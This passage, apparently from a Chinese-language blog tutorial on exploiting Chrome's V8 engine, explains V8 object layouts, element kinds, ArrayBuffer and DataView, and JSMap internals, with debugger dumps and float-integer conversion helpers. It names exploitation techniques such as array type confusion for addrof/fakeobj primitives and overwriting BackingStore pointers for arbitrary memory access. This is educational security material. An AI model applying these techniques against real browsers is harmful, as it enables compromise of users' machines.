class="line">pwndbg&gt; job 0x37815f38bba9</span><br><span class="line">0x37815f38bba9: [JSArray]</span><br><span class="line"> - map: 0x39d6446c3069 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1b0fcc0517a1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x37815f38bb21 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x010c0d5c0c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x247fa62001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37815f38bb21 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x010c0d5c74b1 &lt;String[#1]: a&gt;</span><br><span class="line">           1: 0x010c0d5c7571 &lt;String[#1]: b&gt;</span><br><span class="line">           2: 0x1b0fcc05f4f9 &lt;String[#1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x37815f38bba9</span><br><span class="line">0x37815f38bba9: [JSArray]</span><br><span class="line"> - map: 0x39d6446c30b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1b0fcc0517a1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x37815f38bbc9 &lt;FixedArray[3]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x010c0d5c0c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x247fa62001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37815f38bbc9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x010c0d5c74b1 &lt;String[#1]: a&gt;</span><br><span class="line">           1: 0x010c0d5c05b1 &lt;the_hole&gt;</span><br><span class="line">           2: 0x1b0fcc05f4f9 &lt;String[#1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x37815f38bba9</span><br><span class="line">0x37815f38bba9: [JSArray]</span><br><span class="line"> - map: 0x39d6446ca599 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x37815f38bbf1 &lt;Object map = 0x39d6446ca639&gt;</span><br><span class="line"> - elements: 0x37815f38bbc9 &lt;FixedArray[3]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x010c0d5c0c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x247fa62001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37815f38bbc9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x010c0d5c74b1 &lt;String[#1]: a&gt;</span><br><span class="line">           1: 0x010c0d5c05b1 &lt;the_hole&gt;</span><br><span class="line">           2: 0x1b0fcc05f4f9 &lt;String[#1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x37815f38bbf1</span><br><span class="line">0x37815f38bbf1: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x39d6446ca639 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties]</span><br><span class="line"> - prototype: 0x1b0fcc042091 &lt;Object map = 0x39d6446c0229&gt;</span><br><span class="line"> - elements: 0x37815f38bc29 &lt;FixedArray[19]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x37815f38bd01 &lt;NameDictionary[17]&gt; &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37815f38bc29 &lt;FixedArray[19]&gt; &#123;</span><br><span class="line">           0: 0x010c0d5c05b1 &lt;the_hole&gt;</span><br><span class="line">           1: 0x1b0fcc05f551 &lt;String[#1]: B&gt;</span><br><span class="line">           2: 0x1b0fcc05f581 &lt;String[#1]: C&gt;</span><br><span class="line">        3-18: 0x010c0d5c05b1 &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/54ccd1274efaf3d69751016075870e1a.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="Fast-Elements-Dictionary-Elements"><a href="#Fast-Elements-Dictionary-Elements" class="headerlink" title="Fast Elements &amp; Dictionary Elements"></a>Fast Elements &amp; Dictionary Elements</h3><p><code>Fast Elements</code> 和 <code>Dictionary Elements</code> 的区别是存储方式是线性保存还是词典保存。 <code>Dictionary Elements</code> 主要用于 <code>Holey Element</code> 特别多的情况。</p>
<h1 id="常见类型结构"><a href="#常见类型结构" class="headerlink" title="常见类型结构"></a>常见类型结构</h1><p>处理通用对象外，v8 还内置了一些常见类型。</p>
<p>在 v8 源码的 <code>v8/src/objects/objects.h</code> 中有对 v8 各种类型之间继承关系的描述。</p>
<blockquote>
<p> Most object types in the V8 JavaScript are described in this file.</p>
<p> Inheritance hierarchy:</p>
<ul>
<li>Object<ul>
<li>Smi          (immediate small integer)</li>
<li>TaggedIndex  (properly sign-extended immediate small integer)</li>
<li>HeapObject   (superclass for everything allocated in the heap)<ul>
<li>JSReceiver  (suitable for property access)<ul>
<li>JSObject<ul>
<li>JSArray<ul>
<li>TemplateLiteralObject</li>
</ul>
</li>
<li>JSArrayBuffer</li>
<li>JSArrayBufferView<ul>
<li>JSTypedArray</li>
<li>JSDataView</li>
</ul>
</li>
<li>JSCollection<ul>
<li>JSSet</li>
<li>JSMap</li>
</ul>
</li>
<li>JSCustomElementsObject (may have elements despite empty FixedArray)<ul>
<li>JSSpecialObject (requires custom property lookup handling)<ul>
<li>JSGlobalObject</li>
<li>JSGlobalProxy</li>
<li>JSModuleNamespace</li>
</ul>
</li>
<li>JSPrimitiveWrapper</li>
</ul>
</li>
<li>JSDate</li>
<li>JSFunctionOrBoundFunctionOrWrappedFunction<ul>
<li>JSBoundFunction</li>
<li>JSFunction</li>
<li>JSWrappedFunction</li>
</ul>
</li>
<li>JSGeneratorObject</li>
<li>JSMapIterator</li>
<li>JSMessageObject</li>
<li>JSRegExp</li>
<li>JSSetIterator</li>
<li>JSShadowRealm</li>
<li>JSSharedStruct</li>
<li>JSStringIterator</li>
<li>JSTemporalCalendar</li>
<li>JSTemporalDuration</li>
<li>JSTemporalInstant</li>
<li>JSTemporalPlainDate</li>
<li>JSTemporalPlainDateTime</li>
<li>JSTemporalPlainMonthDay</li>
<li>JSTemporalPlainTime</li>
<li>JSTemporalPlainYearMonth</li>
<li>JSTemporalTimeZone</li>
<li>JSTemporalZonedDateTime</li>
<li>JSWeakCollection<ul>
<li>JSWeakMap</li>
<li>JSWeakSet</li>
</ul>
</li>
<li>JSCollator            &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSDateTimeFormat      &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSDisplayNames        &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSDurationFormat      &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSListFormat          &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSLocale              &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSNumberFormat        &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSPluralRules         &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSRelativeTimeFormat  &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSSegmenter           &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSSegments            &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSSegmentIterator     &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>JSV8BreakIterator     &#x2F;&#x2F; If V8_INTL_SUPPORT enabled.</li>
<li>WasmExceptionPackage</li>
<li>WasmTagObject</li>
<li>WasmGlobalObject</li>
<li>WasmInstanceObject</li>
<li>WasmMemoryObject</li>
<li>WasmModuleObject</li>
<li>WasmTableObject</li>
<li>WasmSuspenderObject</li>
</ul>
</li>
<li>JSProxy</li>
</ul>
</li>
<li>FixedArrayBase<ul>
<li>ByteArray</li>
<li>BytecodeArray</li>
<li>FixedArray<ul>
<li>HashTable<ul>
<li>Dictionary</li>
<li>StringTable</li>
<li>StringSet</li>
<li>CompilationCacheTable</li>
<li>MapCache</li>
</ul>
</li>
<li>OrderedHashTable<ul>
<li>OrderedHashSet</li>
<li>OrderedHashMap</li>
</ul>
</li>
<li>FeedbackMetadata</li>
<li>TemplateList</li>
<li>TransitionArray</li>
<li>ScopeInfo</li>
<li>SourceTextModuleInfo</li>
<li>ScriptContextTable</li>
<li>ClosureFeedbackCellArray</li>
</ul>
</li>
<li>FixedDoubleArray</li>
</ul>
</li>
<li>PrimitiveHeapObject<ul>
<li>BigInt</li>
<li>HeapNumber</li>
<li>Name<ul>
<li>String<ul>
<li>SeqString<ul>
<li>SeqOneByteString</li>
<li>SeqTwoByteString</li>
</ul>
</li>
<li>SlicedString</li>
<li>ConsString</li>
<li>ThinString</li>
<li>ExternalString<ul>
<li>ExternalOneByteString</li>
<li>ExternalTwoByteString</li>
</ul>
</li>
<li>InternalizedString<ul>
<li>SeqInternalizedString<ul>
<li>SeqOneByteInternalizedString</li>
<li>SeqTwoByteInternalizedString</li>
</ul>
</li>
<li>ConsInternalizedString</li>
<li>ExternalInternalizedString<ul>
<li>ExternalOneByteInternalizedString</li>
<li>ExternalTwoByteInternalizedString</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Symbol</li>
</ul>
</li>
<li>Oddball</li>
</ul>
</li>
<li>Context<ul>
<li>NativeContext</li>
</ul>
</li>
<li>Cell</li>
<li>DescriptorArray</li>
<li>PropertyCell</li>
<li>PropertyArray</li>
<li>InstructionStream</li>
<li>AbstractCode, a wrapper around Code or BytecodeArray</li>
<li>GcSafeCode, a wrapper around Code</li>
<li>Map</li>
<li>Foreign</li>
<li>SmallOrderedHashTable<ul>
<li>SmallOrderedHashMap</li>
<li>SmallOrderedHashSet</li>
</ul>
</li>
<li>SharedFunctionInfo</li>
<li>Struct<ul>
<li>AccessorInfo</li>
<li>AsmWasmData</li>
<li>PromiseReaction</li>
<li>PromiseCapability</li>
<li>AccessorPair</li>
<li>AccessCheckInfo</li>
<li>InterceptorInfo</li>
<li>CallHandlerInfo</li>
<li>EnumCache</li>
<li>TemplateInfo<ul>
<li>FunctionTemplateInfo</li>
<li>ObjectTemplateInfo</li>
</ul>
</li>
<li>Script</li>
<li>DebugInfo</li>
<li>BreakPoint</li>
<li>BreakPointInfo</li>
<li>CallSiteInfo</li>
<li>CodeCache</li>
<li>PropertyDescriptorObject</li>
<li>PromiseOnStack</li>
<li>PrototypeInfo</li>
<li>Microtask<ul>
<li>CallbackTask</li>
<li>CallableTask</li>
<li>PromiseReactionJobTask<ul>
<li>PromiseFulfillReactionJobTask</li>
<li>PromiseRejectReactionJobTask</li>
</ul>
</li>
<li>PromiseResolveThenableJobTask</li>
</ul>
</li>
<li>Module<ul>
<li>SourceTextModule</li>
<li>SyntheticModule</li>
</ul>
</li>
<li>SourceTextModuleInfoEntry</li>
<li>StackFrameInfo</li>
</ul>
</li>
<li>FeedbackCell</li>
<li>FeedbackVector</li>
<li>PreparseData</li>
<li>UncompiledData<ul>
<li>UncompiledDataWithoutPreparseData</li>
<li>UncompiledDataWithPreparseData</li>
</ul>
</li>
<li>SwissNameDictionary</li>
</ul>
</li>
</ul>
</li>
</ul>
<p> Formats of Object::ptr_:   Smi:        [31 bit signed int] 0<br> HeapObject: [32 bit direct pointer] (4 byte aligned) | 01</p>
</blockquote>
<h2 id="Smi"><a href="#Smi" class="headerlink" title="Smi"></a>Smi</h2><p>所有不超过 0x7FFFFFFF 的整数都以 <code>Smi</code> 的形式存储。</p>
<ul>
<li>在 32 位上可以表示有符号的 31 位的整数，通过右移一位可以获得原始值。<br>![在这里插入图片描述](<a class="link"   target="_blank" rel="noopener" href="https://i-blog.csdnimg.cn/blog_migrate/ae233d26782a49735319c7940496238c.png" >https://i-blog.csdnimg.cn/blog_migrate/ae233d26782a49735319c7940496238c.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;30%x)	</li>
<li>在 64 位上可以表示有符号的32位的整数，通过右移 32 位可以获得原始值<br>![在这里插入图片描述](<a class="link"   target="_blank" rel="noopener" href="https://i-blog.csdnimg.cn/blog_migrate/c30841e50e497ec96739d3edc71fed5f.png" >https://i-blog.csdnimg.cn/blog_migrate/c30841e50e497ec96739d3edc71fed5f.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;60%x)</li>
</ul>
<h2 id="HeapObject-指针"><a href="#HeapObject-指针" class="headerlink" title="HeapObject 指针"></a>HeapObject 指针</h2><p>最低位为 1 表示指向 <code>HeapObject</code> 的指针。</p>
<ul>
<li>32 位<br>  ![在这里插入图片描述](<a class="link"   target="_blank" rel="noopener" href="https://i-blog.csdnimg.cn/blog_migrate/582ef8279deb472ca013ef9053ded720.png" >https://i-blog.csdnimg.cn/blog_migrate/582ef8279deb472ca013ef9053ded720.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;60%x)</li>
<li>64位	<br> ![在这里插入图片描述](<a class="link"   target="_blank" rel="noopener" href="https://i-blog.csdnimg.cn/blog_migrate/f90c4d59d4c6283024b03acd9096a47b.png" >https://i-blog.csdnimg.cn/blog_migrate/f90c4d59d4c6283024b03acd9096a47b.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;60%x)</li>
</ul>
<h2 id="Heap-Number"><a href="#Heap-Number" class="headerlink" title="Heap Number"></a>Heap Number</h2><p>表示不能在 <code>Smi</code> 范围内表⽰的整数，均以 double 值的形式保存在 <code>Heap Number</code> 的 <code>Value</code> 里。<br>![在这里插入图片描述](<a class="link"   target="_blank" rel="noopener" href="https://i-blog.csdnimg.cn/blog_migrate/2603f1a7f65fcda2dc4cfd0c167abd43.png" >https://i-blog.csdnimg.cn/blog_migrate/2603f1a7f65fcda2dc4cfd0c167abd43.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;60%x)</p>
<h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><p>保存字符串对象，具体结构各版本之间可能存在差异。<br>![在这里插入图片描述](<a class="link"   target="_blank" rel="noopener" href="https://i-blog.csdnimg.cn/blog_migrate/6843b54efe0c93343146abc1ca48869c.png" >https://i-blog.csdnimg.cn/blog_migrate/6843b54efe0c93343146abc1ca48869c.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;60%x)</p>
<h2 id="JSArray"><a href="#JSArray" class="headerlink" title="JSArray"></a>JSArray</h2><p>继承自 <code>Object</code> ，<code>HeapObject</code> ，<code>JSReceiver</code> 。<br>![在这里插入图片描述](<a class="link"   target="_blank" rel="noopener" href="https://i-blog.csdnimg.cn/blog_migrate/c92fe3233ac7844836598061c02f0ec5.png" >https://i-blog.csdnimg.cn/blog_migrate/c92fe3233ac7844836598061c02f0ec5.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;80%x)<br>v8 的 <code>JSArray</code> 遵循图中格的变化，从左到右，从上到下，不可逆。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a304a5a6054e7c0085783876f4d2f007.png"
                      alt="在这里插入图片描述"
                ></p>
<p>规律：</p>
<ul>
<li>存在 <code>Smi</code> 和浮点数则都用浮点数表示</li>
<li>存在 <code>Object</code> 类型则都用 <code>Object</code> 类型表示。</li>
<li><code>elements</code> 之间空隙过大转为字典存储。</li>
</ul>
<p>在实际的漏洞利用中，我们常构造出 double array 和 obj array 的类型混淆，从而构建 addrof 和 fakeobj 原语。</p>
<h2 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h2><p><code>JSArrayBuffer</code> ，顾名思义，就是保存有⼀个被称作 <code>BackingStore</code> 的 buffer 的对象。<br>在 V8 中，对象通常被存放在由 V8 GC 管理的 mapped 区域，然而 <code>BackingStore</code> 是⼀个不被 V8 GC 管理的区域，(事实上它在 Chrome 里是由 PartitionAlloc 来管理，在 d8 里则是用 ptmalloc 来模拟管理)，此外，由于它不是由 GC 管理的 <code>HeapObject</code> ，因 此指向 <code>BackingStore</code> 的指针不是 <code>Tagged Value</code>（末尾不能为1）。<br>![在这里插入图片描述](<a class="link"   target="_blank" rel="noopener" href="https://i-blog.csdnimg.cn/blog_migrate/dc99cfff31fb6bf83e791fc23fb4702e.png" >https://i-blog.csdnimg.cn/blog_migrate/dc99cfff31fb6bf83e791fc23fb4702e.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;80%x)</p>
<ul>
<li>虽然在 <code>ArrayBuffer</code> 中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出 <code>BackingStore</code> 数组的范围。<br>同样，如果也可以重写 <code>BackingStore</code> 指针，则可以读取和写入任意内存地址，这些是在 exploit 中常用的方法。</li>
</ul>
<h2 id="JSTypedArray"><a href="#JSTypedArray" class="headerlink" title="JSTypedArray"></a>JSTypedArray</h2><p>由于 <code>JSArrayBuffer</code> 实际上只是持有 <code>BackingStore</code> 指针的对象，换句话说，它只是⼀个 buffer ，所以在 js 的设计⾥，对 <code>BackStore</code> 的读写需要依赖于 <code>TypedArray</code> 或者 <code>DataView</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/2c6b74b6162897cfdaeac0710e4ab8fa.png"
                      alt="在这里插入图片描述"
                ><br>在漏洞利用时通常使用 <code>JSTypedArray</code> 进行整型和浮点数类型的转换。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"><span class="keyword">var</span> i64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    f64[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> i64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    i64[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let val = &quot;0x1145141919810&quot;;</span></span><br><span class="line"><span class="keyword">let</span> val = <span class="number">0x1145141919810n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">u2d</span>(val));</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(<span class="title function_">u2d</span>(val))));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.501041597677047e-309</span></span><br><span class="line"><span class="comment">// 0x0001145141919810</span></span><br></pre></td></tr></table></figure></div>

<h2 id="JSDataView"><a href="#JSDataView" class="headerlink" title="JSDataView"></a>JSDataView</h2><p>也是用来读写 <code>ArrayBuffer</code> 的 <code>BackingStore</code> 的内容的对象，在 exploit 里常用作最后的任意地址读写原语的构造。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a9646d8acb9db82a8299671d179052f1.png"
                      alt="在这里插入图片描述"
                ><br>利用 <code>JDataView</code> 实现的类型转换：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> val = <span class="number">0x1145141919810n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">u2d</span>(val));</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(<span class="title function_">u2d</span>(val))));</span><br></pre></td></tr></table></figure></div>

<h2 id="JSMap"><a href="#JSMap" class="headerlink" title="JSMap"></a>JSMap</h2><p><code>JSMap</code> 是一种可以按照添加顺序遍历其中元素的 Hash Map ，即 <code>OrderedHashMap</code>。在 V8 漏洞利用中常与 Hole 类型漏洞结合使用。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br></pre></td></tr></table></figure></div>
<p>以 <code>9.5.172</code> 版本 V8 为例，<code>OrderedHashMap</code> 的查看方式如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/fcff33b0bb8c869c3094c13b2e01494b.png"
                      alt="在这里插入图片描述"
                ><br>这里解释一下各个字段的含义：</p>
<ul>
<li><code>FixedArray length</code>：是 V8 在访问 <code>OrderedHashMap</code> 时会将整个 <code>OrderedHashMap</code> 看作一个 <code>Array</code>，这个就是 <code>Array</code> 的长度。即除去 <code>Map</code> 和 <code>FixedArray length</code> 外的部分的长度的字节数除以 4 。</li>
<li><code>elements</code>：<code>Map</code> 中的 <code>key</code> 的数量。</li>
<li><code>delete</code>：<code>Map</code> 中删除的元素数量，也就是当前 <code>Map</code> 中 <code>Hole</code> 的数量。</li>
<li><code>buckets(smi)</code>：后面 <code>buckets(HashTable)</code> 的长度，通常是 2 的整数次幂。</li>
<li><code>capacity</code>：<code>elements</code> 区域能存放的 <code>Entry</code> 的数量。<code>capacity</code> 是 <code>buckets</code> 乘 2 计算出来的，在 <code>OrderedHashMap</code> 的内存区域中也没有体现。</li>
<li><code>buckets(HashTable)</code>：哈希表，在  <code>ComputeUnseededHash(key) &amp; (buckets - 1)</code> 计算出的位置上存放键值对在 <code>elements</code> 中的下标（实际是  <code>elements</code> 中的下标索引的一个单向链表）。该表默认填充为 -1 。</li>
<li><code>elements</code>：按照加入的顺序存放所有键值对组成的 <code>Entry</code> 。该表默认填充为 <code>undefine</code> 。</li>
</ul>
<p><strong>注意：在这个版本的 v8 中 32 位的 smi 不是左移 32 位而是左移 1 位，占用 4 字节。例如 1 表示为 0x00000002，-1 表示为 0xFFFFFFFE 。</strong></p>
<p><code>OrderedHashMap</code> 在内存中的分布大致如下图所示，其中每个格子的大小为 4 字节。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/bde9dfcca26eff4e11825181c59cd570.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p><code>set(key, value)</code> 是 <code>Map</code> 中用来设置键值对的方法，具体接口定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">TF_BUILTIN</span>(MapPrototypeSet, CollectionsBuiltinsAssembler)</span><br></pre></td></tr></table></figure></div>

<p>这里假设 <code>key</code> 的类型为 <code>smi</code> ，首先 <code>TryLookupOrderedHashTableIndex</code> 查找 <code>key</code> 对应的 <code>Entry</code> ，从代码中可以看到 <code>JSMap</code> 使用的哈希函数 <code>ComputeUnseededHash</code> 。程序最终通过 <code>FindOrderedHashTableEntry</code> 查找 <code>key</code> 对应的 <code>Entry</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TNode&lt;Word32T&gt; <span class="title">CollectionsBuiltinsAssembler::ComputeUnseededHash</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;IntPtrT&gt; key)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// See v8::internal::ComputeUnseededHash()</span></span><br><span class="line">  TNode&lt;Word32T&gt; hash = <span class="built_in">TruncateIntPtrToInt32</span>(key);</span><br><span class="line">  hash = <span class="built_in">Int32Add</span>(<span class="built_in">Word32Xor</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">0xFFFFFFFF</span>)),</span><br><span class="line">                  <span class="built_in">Word32Shl</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">15</span>)));</span><br><span class="line">  hash = <span class="built_in">Word32Xor</span>(hash, <span class="built_in">Word32Shr</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">12</span>)));</span><br><span class="line">  hash = <span class="built_in">Int32Add</span>(hash, <span class="built_in">Word32Shl</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">2</span>)));</span><br><span class="line">  hash = <span class="built_in">Word32Xor</span>(hash, <span class="built_in">Word32Shr</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">4</span>)));</span><br><span class="line">  hash = <span class="built_in">Int32Mul</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">2057</span>));</span><br><span class="line">  hash = <span class="built_in">Word32Xor</span>(hash, <span class="built_in">Word32Shr</span>(hash, <span class="built_in">Int32Constant</span>(<span class="number">16</span>)));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Word32And</span>(hash, <span 